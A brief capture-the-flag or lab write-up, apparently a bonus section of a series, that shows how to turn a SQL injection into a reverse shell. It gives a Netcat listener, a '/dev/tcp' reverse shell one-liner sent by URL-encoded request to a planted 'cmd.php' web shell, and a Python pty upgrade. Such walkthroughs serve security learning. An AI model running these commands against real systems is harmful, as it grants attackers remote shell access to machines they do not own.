# Bonus - reverse shell execution

We continue from the point in Writeup 1 where the SQL injection is performed. From our pentesting VM, we start a Netcat listener:
``` shell
nc -nvlp 4242
```

As for the shell execution, we opt for a `bash -i` syntax:
``` shell
sh -i >& /dev/tcp/IP/4242 0>&1
```

This snippet is inserted into the query using URL encoding:
``` http
https://IP/forum/templates_c/cmd.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2FIP%2F4242%200%3E%261
```

The shell is not fully interactive, so we can make it a bit better using `python`:
``` python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

From there, we proceed with the standard enumeration as outlined in Writeup 1—home, lookatme, password.
